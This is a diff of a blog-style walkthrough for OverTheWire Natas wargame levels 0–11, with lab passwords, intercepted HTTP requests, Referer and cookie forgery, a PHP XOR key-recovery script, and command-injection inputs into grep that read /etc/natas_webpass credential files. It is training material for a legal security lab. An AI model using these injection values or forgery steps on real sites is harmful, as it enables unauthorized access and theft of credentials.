@@ -2,8 +2,8 @@
 title: Overthewire - Natas
 # author: Grace JyL
 date: 2020-02-20 11:11:11 -0400
-description: 
-excerpt_separator: 
+description:
+excerpt_separator:
 categories: [Wargame, Overthewire]
 tags: [Wargame, Overthewire]
 math: true
@@ -18,15 +18,16 @@ Overthewire_Natas
 
 [toc]
 
-Natas teaches the basics of serverside web-security.
+---
+
+Natas teaches the basics of server side web-security.
 - [Overthewire_Natas](https://overthewire.org/wargames/natas/)
 - Each level of natas consists of its own website located at `http://natasX.natas.labs.overthewire.org`, where X is the level number.
-- There is no SSH login. 
+- There is no SSH login.
 - To access a level, enter the username for that level (e.g. natas0 for level 0) and its password.
 
 - many websites such as Facebook, Google, and even Amazon, store information in SQL Databases. These databases are connected to the web servers, allowing them to process user transactions, login requests, and a countless amount of other things!
 - These servers also handle user encryption, session keys, etc. One coding mistake; allowing a malicious attacker to inject SQL code into a query, or even inject special characters into a form, or the URL, can be devastating!
-
 
 ---
 
@@ -66,7 +67,7 @@ URL:      http://natas1.natas.labs.overthewire.org
 打开 Developer Tools 并聚焦到控制台  | Ctrl + Shift + J	     | Cmd + Opt + J
 检查检查器（取消停靠第一个后按）	     | Ctrl + Shift + I	       | Cmd + Opt + I
 
-```py
+```html
 <html>
 
 <head>
@@ -99,7 +100,7 @@ Username: natas2
 URL:      http://natas2.natas.labs.overthewire.org
 ZluruAthQk7Q2MqmDeTiUij2ZvWy2mBi
 
-```py
+```html
 -------------------------------------------------------------------
 <body>
 <h1>natas2</h1>
@@ -135,7 +136,7 @@ Username: natas3
 URL:      http://natas3.natas.labs.overthewire.org
 sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14
 
-```py
+```html
 -------------------------------------------------------------------
 # Page Source
 <body>
@@ -146,15 +147,15 @@ sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14
   </div>
 </body>
 
-“Not even Google will find it this time…” is hint. I
-it’s referring to robots.txt.
+# “Not even Google will find it this time…” is hint.
+# it’s referring to robots.txt.
 
-# http://natas3.natas.labs.overthewire.org/robots.txt
+http://natas3.natas.labs.overthewire.org/robots.txt
 User-agent: *
 Disallow: /s3cr3t/
 
-so the robots.txt is disallowing crawlers to find /s3cr3t/.
-# http://natas3.natas.labs.overthewire.org/s3cr3t/.
+# so the robots.txt is disallowing crawlers to find /s3cr3t/.
+http://natas3.natas.labs.overthewire.org/s3cr3t/.
 Index of /s3cr3t
 [ICO]	Name	Last modified	Size	Description
 [PARENTDIR]	Parent Directory	 	-	 
@@ -166,17 +167,23 @@ natas4:Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ
 ---
 
 ## Natas Level 3 → Level 4 `use brup to intercept request, update Referer url.`
+
+> Solution: intercept the packet, change the referrer url
+
 Username: natas4
 URL:      http://natas4.natas.labs.overthewire.org
 Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ
 
-“HTTP Referrer”.
-- set up firefox and brup
-- making sure our proxy is set up for localhost @ 127.0.0.1.
-- set up network settings to allow Firefox to use localhost proxy. Menu > Preferences > Advanced > Network > Connection Settings > `Manual proxy configuration: HTTP Proxy: 127.0.0.1 Port:8080`
+- “HTTP Referrer”.
+    - set up firefox and brup
+    - making sure proxy is set up for localhost @ 127.0.0.1.
+        - Brup:
+        - Proxy > Option >
+    - set up Firefox network settings
+        - allow Firefox to localhost proxy.
+        - Menu > Preferences > Advanced > Network > Connection Settings > `Manual proxy configuration: HTTP Proxy: 127.0.0.1 Port:8080`
 
-
-```py
+```html
 "Access disallowed. You are visiting from "" while authorized users should come only from "http://natas5.natas.labs.overthewire.org/""
 --------------------------------------------------------
 goto http://natas4.natas.labs.overthewire.org/
@@ -193,12 +200,11 @@ Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
 Accept-Encoding: gzip, deflate
 Authorization: Basic bmF0YXM0Olo5dGtSa1dtcHQ5UXI3WHJSNWpXUmtnT1U5MDFzd0Va
 Connection: close
-Referer: http://natas4.natas.labs.overthewire.org/index.php
+# add this line
+Referer: http://natas5.natas.labs.overthewire.org/
 Upgrade-Insecure-Requests: 1
 --------------------------------------------------------
-change it to:
-Referer: http://natas5.natas.labs.overthewire.org/
---------------------------------------------------------
+
 "Access granted. The password for natas5 is iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq"
 ```
 
@@ -207,22 +213,14 @@ Note: Once done, go back to Network Settings and select “Use System Proxy Sett
 ---
 
 ## Natas Level 4 → Level 5
+
+> Solution: intercept the packet, change the cookie
+
 Username: natas5
 URL:      http://natas5.natas.labs.overthewire.org
 iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq
 
-```py
-# send the passwd turn
-GET / HTTP/1.1
-Host: natas5.natas.labs.overthewire.org
-User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:73.0) Gecko/20100101 Firefox/73.0
-Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
-Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
-Accept-Encoding: gzip, deflate
-Connection: close
-Upgrade-Insecure-Requests: 1
-Authorization: Basic bmF0YXM1OmlYNklPZm1wTjdBWU9RR1B3dG4zZlhwYmFKVkpjSGZx
-
+```html
 # refresh the Page
 GET / HTTP/1.1
 Host: natas5.natas.labs.overthewire.org
@@ -241,12 +239,17 @@ Upgrade-Insecure-Requests: 1
 "Access granted. The password for natas6 is aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1"
 ```
 
+---
+
 ## Natas Level 5 → Level 6
+
+> Solution: source code
+
 Username: natas6
 URL:      http://natas6.natas.labs.overthewire.org
 aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1
 
-```py
+```html
 --------------------------------------------------------
 <body>
 <h1>natas6</h1>
@@ -297,11 +300,14 @@ $secret = "FOEIUWGHFEEUHOFUOIU";
 ---
 
 ## Natas Level 6 → Level 7
+
+> Solution: intercept the packet, change the cookie
+
 Username: natas7
 URL:      http://natas7.natas.labs.overthewire.org
 7z3hEENjQtflzgnT29q7wAvMNfZdh0i9
 
-```py
+```html
 <html>
 <head>
 <!-- This stuff in the header has nothing to do with the level -->
@@ -334,11 +340,14 @@ DBfUBfqQG69KvJvJ1iAbMoIpwSNQ9bWe
 ---
 
 ## Natas Level 7 → Level 8
+
+> Solution: decode the base64
+
 Username: natas8
 URL:      http://natas8.natas.labs.overthewire.org
 DBfUBfqQG69KvJvJ1iAbMoIpwSNQ9bWe
 
-```py
+```html
 --------------------------------------------------------
 View "sourcecode"
 --------------------------------------------------------
@@ -367,7 +376,7 @@ if(array_key_exists("submit", $_POST)) {
 ?>
 ...
 --------------------------------------------------------
-the secret code we need is encoded.
+# the secret code we need is encoded.
 the “secret” entered is converted from "bin" to "hex", reversed, and then "base64 encoded".
 return bin2hex(strrev(base64_encode($secret)))
 "3d3d516343746d4d6d6c315669563362"
@@ -386,16 +395,20 @@ got the password W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl
 ---
 
 ## Natas Level 8 → Level 9
+
+> Solution: decode the base64
+
 Username: natas9
 URL:      http://natas9.natas.labs.overthewire.org
 W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl
 
-```py
+```html
 Find words containing:
 Output:
 --------------------------------------------------------
-Output:
-<pre><?
+sourcecode:
+<pre>
+<?
 $key = "";
 if(array_key_exists("needle", $_REQUEST)) {
     $key = $_REQUEST["needle"];
@@ -403,11 +416,13 @@ if(array_key_exists("needle", $_REQUEST)) {
 if($key != "") {
     passthru("grep -i $key dictionary.txt");
 }
-?></pre>
+?>
+</pre>
 --------------------------------------------------------
-type in the word “password”
-then the passthru command in the PHP script: grep -i password dictionary.txt.
-key is encapsulated in quotes, no input filtering, able to enter special characters.
+# type in the word “password”
+# then the passthru command in the PHP script:
+grep -i password dictionary.txt.
+# key is encapsulated in quotes, no input filtering, able to enter special characters.
 --------------------------------------------------------
 use the ";" command separator to use 2 commands in one line.
 use the "#" command, comment out the rest of the text following the symbol.
@@ -425,17 +440,21 @@ nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu
 ---
 
 ## Natas Level 9 → Level 10
+
+> Solution: decode the base64
+
 Username: natas10
 URL:      http://natas10.natas.labs.overthewire.org
 nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu
 
-```py
+```html
 For security reasons, we now filter on certain characters
 Find words containing:
 Output:
 --------------------------------------------------------
 Output:
-<pre><?
+<pre>
+<?
 $key = "";
 if(array_key_exists("needle", $_REQUEST)) {
     $key = $_REQUEST["needle"];
@@ -447,15 +466,19 @@ if($key != "") {
         passthru("grep -i $key dictionary.txt");
     }
 }
-?></pre>
+?>
+</pre>
 --------------------------------------------------------
-now they are filtering the ; and & command.
+# now they are filtering the ; and & command.
 but they still haven’t fixed the way “key” is storing input.
-exploit this the same way we did in 9; but this time just using regular expressions.
+exploit this the same way we did in 9;
+but this time just using regular expressions.
 
 enter ".* /etc/natas_webpass/natas11 #"
 ".*" : tell grep to search for all, while ignoring case, and match it to etc/natas_webpass/natas11.
 "#" : comments out dictionary.txt, preventing any errors from occurring.
+
+grep -i .* /etc/natas_webpass/natas11 # dictionary.txt
 --------------------------------------------------------
 Output:
 .htaccess:AuthType Basic
@@ -467,6 +490,7 @@ Output:
 .htpasswd:natas10:$1$SpbdWYWN$qM554rKY7WrlXF5P6ErYN/
 /etc/natas_webpass/natas11:U82q5TCMMQ9xuFoI3dYX61s7OZD9JKoK
 ```
+
 ---
 
 ## Natas Level 10 → Level 11
@@ -475,11 +499,27 @@ URL:      http://natas11.natas.labs.overthewire.org
 U82q5TCMMQ9xuFoI3dYX61s7OZD9JKoK
 
 
-```py
+```html
 --------------------------------------------------------
 Cookies are protected with XOR encryption
 Background color:
 #ffffff
+--------------------------------------------------------
+<!-- use burpsuite, got cookie -->
+GET /?bgcolor=%23ffffff HTTP/1.1
+Host: natas11.natas.labs.overthewire.org
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:81.0) Gecko/20100101 Firefox/81.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+DNT: 1
+Authorization: Basic bmF0YXMxMTpVODJxNVRDTU1ROXh1Rm9JM2RZWDYxczdPWkQ5SktvSw==
+Connection: close
+Referer: http://natas11.natas.labs.overthewire.org/?bgcolor=%23ffffff
+Cookie: data=ClVLIh4ASCsCBE8lAxMacFMZV2hdVVotEhhUJQNVAmhSEV4sFxFeaAw%3D
+Upgrade-Insecure-Requests: 1
+
+Cookie = ClVLIh4ASCsCBE8lAxMacFMZV2hdVVotEhhUJQNVAmhSEV4sFxFeaAw=
 --------------------------------------------------------
 <?
 $defaultdata = array("showpassword"=>"no", "bgcolor"=>"#ffffff");
@@ -542,6 +582,62 @@ Background color: <input name=bgcolor value="<?=$data['bgcolor']?>">
 <input type=submit value="Set color">
 </form>
 
+--------------------------------------------------------
+XOR Cipher
+A XOR B = C.
+Original_Data XOR KEY = Encrypted_Data
+Original_Data XOR Encrypted_Data = KEY
+
+
+DefaultData XOR cookie = KEY
+correctData XOR KEY = cookieAnswer
+--------------------------------------------------------
+fire up PHP and write the following script to reverse engineer the key.
+<?
+function xor_encrypt($text) {
+    $key = base64_decode('ClVLIh4ASCsCBE8lAxMacFMZV2hdVVotEhhUJQNVAmhSEV4sFxFeaAw=');
+    $outText = '';
+
+    for($i=0;$i<strlen($text);$i++) {
+       $outText .= $text[$i] ^ $key[$i % strlen($key)];
+    }
+
+    return $outText;
+}
+
+$data = array("showpassword"=>"no", "bgcolor"=>"#ffffff");
+print xor_encrypt(json_encode($data));
+?>
+--------------------------------------------------------
+will get the Key Output
+qw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jq.
+--------------------------------------------------------
+replace the $key with our newly found key, edit the showpassword to yes.
+
+<?
+function xor_encrypt($text) {
+    $key = 'qw8J';
+    $outText = '';
+
+    for($i=0;$i<strlen($text);$i++) {
+       $outText .= $text[$i] ^ $key[$i % strlen($key)];
+    }
+
+    return $outText;
+}
+
+$data = array("showpassword"=>"yes", "bgcolor"=>"#ffffff");
+print base64_encode(xor_encrypt(json_encode($data)));
+?>
+--------------------------------------------------------
+Once run the new PHP script
+Original_Data XOR KEY = Encrypted_Data
+
+cookie: ClVLIh4ASCsCBE8lAxMacFMOXTlTWxooFhRXJh4FGnBTVF4sFxFeLFMK
+--------------------------------------------------------
+Burp and submit
+password EDXp0pS26wLKHZy1rDBPUZk0RKfLGIR3
+--------------------------------------------------------
 ```
 
 
